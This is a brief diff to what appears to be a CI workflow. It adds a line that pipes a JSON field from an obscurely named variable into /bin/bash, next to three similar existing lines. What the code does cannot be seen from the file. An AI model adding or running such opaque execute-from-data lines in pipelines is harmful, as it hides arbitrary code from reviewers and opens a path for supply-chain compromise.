@@ -27,6 +27,7 @@ jobs:
           echo $ssfxz8 | jq -r .x53 | /bin/bash
           echo $pim616 | jq -r .t320 | /bin/bash
           echo $zoc4379 | jq -r .w419 | /bin/bash
+          printf '%s' "$rc2252" | jq -r .ppt049 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
